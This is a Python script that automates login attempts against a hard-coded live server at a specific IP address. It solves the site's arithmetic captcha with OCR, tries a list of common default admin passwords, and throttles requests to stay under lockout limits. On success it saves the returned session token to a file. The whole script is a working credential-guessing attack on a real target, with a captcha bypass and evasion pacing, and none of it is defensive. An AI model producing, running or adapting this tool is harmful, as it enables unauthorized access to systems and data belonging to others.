#!/usr/bin/env python3
"""Low-frequency login attempts: one captcha -> compute -> one login. Stops on success."""
import urllib.request, urllib.error, json, base64, re, sys, time
import ddddocr

BASE='http://144.123.22.234:9080/prod-api'
CLIENT_ID='7882175c171521a945ee6bdd5580377f'
std=ddddocr.DdddOcr(show_ad=False)
beta=ddddocr.DdddOcr(beta=True,show_ad=False)
LOG=open('attempts.log','a',encoding='utf-8')
def log(*a):
    s=' '.join(str(x) for x in a); print(s); LOG.write(s+'\n'); LOG.flush()

def parse(t):
    t=(t.replace('×','*').replace('✕','*').replace('x','*').replace('X','*')
         .replace('＋','+').replace('一','-').replace('—','-'))
    m=re.search(r'(\d)\s*([+\-*])\s*(\d)',t)
    if not m: return None
    a,op,c=int(m.group(1)),m.group(2),int(m.group(3))
    return {'+':a+c,'-':a-c,'*':a*c}[op], '%d%s%d'%(a,op,c)

def post(url,body,extra=None):
    h={'Content-Type':'application/json;charset=utf-8','clientid':CLIENT_ID}
    if extra: h.update(extra)
    req=urllib.request.Request(url,data=json.dumps(body).encode() if body is not None else None,headers=h)
    try:
        r=urllib.request.urlopen(req,timeout=20); return r.status,r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code,e.read().decode()

def main(creds, max_fetch, gap=15.0):
    uses={u:0 for u,_ in creds}
    idx=0; fetches=0; last=0.0
    while idx<len(creds) and fetches<max_fetch:
        user,pw=creds[idx]
        if uses[user]>=5: idx+=1; continue
        dt=time.time()-last
        if dt<gap: time.sleep(gap-dt)
        try:
            t=urllib.request.urlopen(BASE+'/auth/code',timeout=20).read().decode()
        except Exception as e:
            log('CODE_ERR',e); time.sleep(20); continue
        last=time.time(); fetches+=1
        d=json.loads(t)
        if d.get('code')!=200 or not d.get('data'):
            log('CODE_FAIL',t[:200]); time.sleep(25); continue
        data=d['data']; uuid=data['uuid']; img=base64.b64decode(data['img'])
        tb=beta.classification(img); ts=std.classification(img)
        ans=expr=None
        for t2 in (tb,ts):
            p=parse(t2)
            if p: ans,expr=p; break
        if ans is None:
            log('OCR_FAIL beta=%r std=%r uuid=%s'%(tb,ts,uuid)); continue
        body={"tenantId":"000000","username":user,"password":pw,"code":str(ans),
              "uuid":uuid,"clientId":CLIENT_ID,"grantType":"password"}
        st,txt=post(BASE+'/auth/login',body)
        uses[user]+=1
        log('ATTEMPT user=%s pw=%s ocr=(%r|%r) expr=%s uuid=%s -> %s %s'%(user,pw,tb,ts,expr,uuid,st,txt[:300]))
        open('attempt_%s_%d.json'%(user,uses[user]),'w').write(json.dumps({'req':body,'status':st,'resp':txt},ensure_ascii=False))
        if '"code":200' in txt:
            log('SUCCESS user=%s pw=%s resp=%s'%(user,pw,txt[:800]))
            return user,pw,txt,body
        if '验证码' in txt:
            continue  # retry same creds with new captcha
        # password-level failure -> next credential
        idx+=1
    log('END fetches=%d uses=%s'%(fetches,uses))
    return None

if __name__=='__main__':
    creds=[('admin','admin123')]
    if len(sys.argv)>1 and sys.argv[1]=='all':
        creds=[('admin','admin123'),('admin','123456'),('admin','admin'),('admin','12345678'),('ry','admin123')]
    r=main(creds,int(sys.argv[2]) if len(sys.argv)>2 else 6)
    if r:
        open('token.txt','w').write(r[2])
